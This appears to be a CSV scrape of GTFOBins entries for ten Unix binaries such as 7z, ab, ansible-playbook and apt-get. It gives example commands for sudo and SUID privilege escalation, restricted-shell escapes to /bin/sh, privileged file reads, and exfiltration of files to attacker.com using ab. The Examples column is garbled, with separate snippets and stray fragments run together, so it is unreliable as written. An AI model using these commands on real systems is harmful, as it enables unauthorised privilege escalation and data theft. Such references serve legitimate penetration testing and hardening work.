Binary Name,URL,Description,Functions,Examples
7z,https://gtfobins.github.io/gtfobins/7z/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so; sudo; LFILE=file_to_read
sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
aa-exec,https://gtfobins.github.io/gtfobins/aa-exec/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,aa-exec /bin/sh; sh -p; -p
ab,https://gtfobins.github.io/gtfobins/ab/,It can exfiltrate files on the network.,File upload; File download; SUID; Sudo,"URL=http://attacker.com/
LFILE=file_to_send
ab -p $LFILE $URL; URL=http://attacker.com/file_to_download
ab -v2 $URL; sh -p"
agetty,https://gtfobins.github.io/gtfobins/agetty/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID,sh -p; -p; sh
alpine,https://gtfobins.github.io/gtfobins/alpine/,"The file is displayed in the alpine curses terminal interface. Other options might be available, for example by pressing S is possible to save the file content elsewhere.",File read; SUID; Sudo,"alpine; S; LFILE=file_to_read
alpine -F ""$LFILE"""
ansible-playbook,https://gtfobins.github.io/gtfobins/ansible-playbook/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF; sudo; TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF"
ansible-test,https://gtfobins.github.io/gtfobins/ansible-test/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,ansible-test shell; sudo; sudo ansible-test shell
aoss,https://gtfobins.github.io/gtfobins/aoss/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,aoss /bin/sh; sudo; sudo aoss /bin/sh
apache2ctl,https://gtfobins.github.io/gtfobins/apache2ctl/,"This includes the file in the actual configuration file, the first line is leaked as an error message.",File read; Sudo,"LFILE=file_to_read
apache2ctl -c ""Include $LFILE"" -k stop; sudo; LFILE=file_to_read
sudo apache2ctl -c ""Include $LFILE"" -k stop"
apt-get,https://gtfobins.github.io/gtfobins/apt-get/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; apt-get changelog apt
!/bin/sh; sudo"
